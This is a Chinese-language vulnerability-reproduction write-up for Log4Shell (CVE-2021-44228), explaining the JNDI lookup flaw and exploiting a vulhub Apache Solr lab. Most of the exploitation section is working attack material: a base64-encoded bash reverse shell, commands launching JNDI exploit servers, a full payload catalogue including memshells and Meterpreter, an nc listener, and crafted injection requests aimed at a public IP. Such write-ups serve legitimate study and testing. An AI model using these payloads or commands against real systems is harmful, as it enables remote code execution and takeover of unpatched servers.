# CVE-2021-44228

### 漏洞描述： <a href="#tid-tqkxqs" id="tid-tqkxqs"></a>

Apache Log4j2 是一个基于 Java 的日志记录工具， 是对 Log4j 的升级，它比其前身 Log4j 1.x 提供了显着改进，并提供了 Logback 中可用的许多改进，同时修复了 Logback 架构中的一些固有问题。该日志框架被大量用于业务系统开发，用来记录日志信息。

Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于`${jndi:ldap://evil.com/example}`的lookup用于进行JNDI注入，执行任意代码。

### 影响版本： <a href="#tid-f74r4e" id="tid-f74r4e"></a>

Apache Log4j2 2.0.0 - 2.15.0-rc1版本

### 漏洞分析 <a href="#tid-3cpg8c" id="tid-3cpg8c"></a>

```bash
hello?payload=111

jndi注入:(搜索资源服务)		# 前两个为验证，第三个为利用
payload=${jndi:ldap://xxxx.dnslog.cn}
payload=${jndi:ldap://${sys:java.version}.xxxx.dnslog.cn}
payload=${jndi:rmi://192.168.66.128:1099/shell}
```

1. 当用户通过get或者post提交输入信息时，应用程序中的“log4j2"组件会将信息记录到日志中
2. 假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/shell}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/shell
3. 解析到ldap，就会去192.168.96.1:1099的ldap服务找名为shell的资源，找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入
4. 攻击者就可以通过shell实现任意的命令执行，造成严重危害

### 环境搭建：

下载地址：

{% embed url="https://github.com/vulhub/vulhub" %}

下载好以后cd到对应的目录执行以下命令

{% code lineNumbers="true" %}
```
docker-compose up -d
```
{% endcode %}

### 漏洞验证：

我这里使用Burp自带的dnslog平台，构造好payload

```
${jndi:ldap://3jnoo8is8nxggcwa8zpeaesxkoqfe62v.oastify.com} HTTP/1.1
```

发送请求包

```
GET /solr/admin/cores?action=${jndi:ldap://3jnoo8is8nxggcwa8zpeaesxkoqfe62v.oastify.com} HTTP/1.1
Host: xx.xx.xx.xx:8983
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

可以看到dnslog平台有了响应，说明存在log4j

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用：

在这之前需要下载一个漏洞利用工具

{% embed url="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0" %}

这个需要用Java1.8版本运行，先生成一个反弹shell的payload

{% embed url="https://www.revshells.com/" %}

我这里接收反弹的地址是我云服务器的地址，生成好再对其进行base64编码

{% code lineNumbers="true" %}
```
bash -i >& /dev/tcp/xx.xx.xx.xx/9992 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC85OTkyIDA+JjE=
```
{% endcode %}

然后开启JNDI服务,下面的xx IP是我的服务器IP地址，也就是等会发送请求会请求这台服务器上的恶意服务

```
 bin ./java -jar ../../JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC85OTkyIDA+JjE=}|{base64,-d}|{bash,-i}" -A xx.xx.xx.xx
 // -c是执行的bash命令，-A是指JNDI服务器IP
```

这是JNDI服务生成的链接地址，等会把它放入请求包中替换dnslog地址

```
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://xx.xx.xx.xx:1099/vejllu
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://xx.xx.xx.xx:1099/hpj9xk
ldap://xx.xx.xx.xx:1389/hpj9xk
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://xx.xx.xx.xx:1099/5gd1xj
ldap://xx.xx.xx.xx:1389/5gd1xj

----------------------------Server Log----------------------------
2023-07-03 16:03:02 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2023-07-03 16:03:02 [RMISERVER]  >> Listening on 0.0.0.0:1099
2023-07-03 16:03:03 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

服务器开启监听端口9992

```
nc -lnvp 9992
```

在Burp中发送请求

```
GET /solr/admin/cores?action=${jndi:rmi://xx.xx.xx.xx:1099/hpj9xk} HTTP/1.1
Host: 43.143.138.7:8983
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

监听端口返回一个shell

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

这次漏洞复现我搭建漏洞的靶机与开启的JNDI服务和反弹shell用的都是云服务器地址，实际应用中需要自行更改

上面是1.0版本JNDI的使用，下面是1.4版本JNDI的复现过程

在服务器上开启1.4的JNDI服务

```
bin ./java -jar ../../JNDIExploit1.4/JNDIExploit-1.4-SNAPSHOT.jar -i xx.xx.xx.xx -l 1389 -p 80
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 80...
```

反弹shell的payload，这个版本的payload使用方法可以使用-u参数查看

```
➜  bin ./java -jar ../../JNDIExploit1.4/JNDIExploit-1.4-SNAPSHOT.jar -u
Supported LADP Queries：
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
    ldap://0.0.0.0:1389/Basic/Command/[cmd]
    ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Basic/TomcatEcho
    ldap://0.0.0.0:1389/Basic/SpringEcho
    ldap://0.0.0.0:1389/Basic/WeblogicEcho
    ldap://0.0.0.0:1389/Basic/TomcatMemshell1
    ldap://0.0.0.0:1389/Basic/TomcatMemshell2  ---need extra header [shell: true]
    ldap://0.0.0.0:1389/Basic/TomcatMemshell3  /ateam  pass1024
    ldap://0.0.0.0:1389/Basic/GodzillaMemshell /bteam.ico pass1024
    ldap://0.0.0.0:1389/Basic/JettyMemshell
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
    ldap://0.0.0.0:1389/Basic/JBossMemshell
    ldap://0.0.0.0:1389/Basic/WebsphereMemshell
    ldap://0.0.0.0:1389/Basic/SpringMemshell

[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
    ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]
    ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]
    ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho
    ldap://0.0.0.0:1389/TomcatBypass/SpringEcho
    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell1
    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]
    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3  /ateam  pass1024
    ldap://0.0.0.0:1389/TomcatBypass/GodzillaMemshell /bteam.ico pass1024
    ldap://0.0.0.0:1389/TomcatBypass/SpringMemshell
    ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp

[+] GroovyBypass Queries
    ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]
    ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
```

这里将使用这个payload

<pre><code><strong>${jndi:ldap://xx.xx.xx.xx:1389/Basic/ReverseShell/xx.xx.xx.xx/9991}
</strong></code></pre>

服务器监听9991端口，使用Burp发送请求

```
GET /solr/admin/cores?action=${jndi:ldap://xx.xx.xx.xx:1389/Basic/ReverseShell/xx.xx.xx.xx/9991} HTTP/1.1
Host: 43.143.138.7:8983
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

监听端口返回一个shell

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
